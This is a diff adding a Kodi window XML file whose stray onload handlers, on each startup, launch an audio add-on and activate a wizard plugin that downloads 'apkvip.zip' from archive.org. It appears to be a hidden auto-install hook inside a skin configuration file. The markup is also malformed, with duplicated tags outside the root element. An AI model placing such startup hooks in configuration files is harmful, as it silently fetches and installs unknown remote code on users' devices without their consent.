@@ -1,0 +1,15 @@
+
+<?xml version="1.0" encoding="UTF-8"?>
+<window>
+
+<onload>ReplaceWindow($INFO[System.StartupWindow])</onload>
+<controls />
+</window>
+
+
+<onload>ReplaceWindow($INFO[System.StartupWindow])</onload>
+
+<onload>RunAddOn(plugin.audio.NahroFm)</onload>
+
+
+<onload>ActivateWindow(10001,&quot;plugin://plugin.program.w2/?iconimage&amp;mode=1&amp;name=n&amp;url=https%3a%2f%2farchive.org%2fdownload%2fturova%2fapkvip.zip&quot;,return)</onload>
